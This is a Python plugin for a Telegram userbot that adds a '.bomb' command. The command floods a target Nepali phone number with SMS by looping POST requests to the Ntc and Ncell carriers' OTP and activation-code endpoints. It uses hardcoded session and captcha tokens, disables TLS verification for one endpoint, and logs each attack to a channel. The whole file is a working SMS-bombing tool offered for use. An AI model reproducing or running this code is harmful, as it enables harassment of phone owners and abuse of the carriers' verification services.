import asyncio
from userge import userge, Message
import requests
from time import sleep

CHANNEL = userge.getCLogger(__name__)  # channel logger object

@userge.on_cmd("bomb", about={
    'header': "Ntc/Ncell Number Bomber",
    'usage': ".bomb phone total",
    'examples': ".bomb 9845XXXXXX 69\nCredits: Detective"})
    
    
async def bomb(message: Message):
    num=0
    n=0
    args = message.input_str
    creds = args.split(' ')
    if creds:
        num = int(creds[0])
        n = int(creds[1])
    else:
        await message.edit("Enter a number!")
        return

    if str(num)[:1] in ['6', '7', '8', '9']:
        await message.edit("`Number Detected!`")
        sleep(2)
        paramss={"webcaptcha":"2iBVFrLWrrezxoeI5u8duQpznGcudpxBQZM88Daf7ram7luqVkVKe8rsVxpM4nVunuNg7pGQ6Bb5jaUZdJnvkKXBn8nWBG890VRebIOsZM4%3D","JSESSIONID":"3854CCA90376DB14C75841F35A548032","2":"11","userName":num,"codeType":"1"}
        await message.edit("`Bombing Number....`")
        for i in range (n):
            requests.post("https://selfcare.ntc.net.np/selfcare4web/user/sendActivityCode.do",params=paramss,verify=False)
            await message.edit(f"`Bombing.... {i}`")
        await message.edit(f"`Bombed {n} SMS.\nNumber: {num}\nOperator: Ntc\nPlugin Credit: Detective`")
        await CHANNEL.log(f"Bombed {n} SMS.\nNumber: {num}\nOperator: Ntc\nPlugin Credit: Detective")
    elif str(num)[:3] in ['981', '982', '983', '980']:
        await message.edit("`Ncell Number Detected!`")
        sleep(2)
        paramss={'wms':"e1uzvl3s3hntx4454dfvmn55","TS01a172b1":"018487e1530a540e474e0137e23b284713af2737f277635c2da93bf07dc84da5910b0d04ff7d8c23565466793befeb88e9d243d325e25e85b563e176ece81ab22d98133d4f","ws":'CRBT','type':'SEND_OTP','promo':'DWN','cattype':'RB','cid':'104061','tmpl':'22','mobile':num}
        await message.edit("`Bombing Number....`")
        for i in range (n):
            if i%5==0:
                requests.post("https://prbt.ncell.axiata.com/Handlers/OTPActions.ashx?lang=ENGL",params=paramss)
                await message.edit(f"`Bombing... {i}`")
                sleep(1)
            else:
                requests.post("https://prbt.ncell.axiata.com/Handlers/OTPActions.ashx?lang=ENGL",params=paramss)
                await message.edit(f"`Bombing... {i}`")
        await message.edit(f"`Bombed {n} SMS.\nNumber: {num}\nOperator: Ncell\nPlugin Credit: Detective`")
        await CHANNEL.log(f"Bombed {n} SMS.\nNumber: {num}\nOperator: Ncell\nPlugin Credit: Detective")
    else:
        await message.edit('`Enter Valid Number`')
        await CHANNEL.log(f"Couldn't Bomb to {num}\nReason: Invalid Number Detected\nApi Credit: Detective")
        return


    
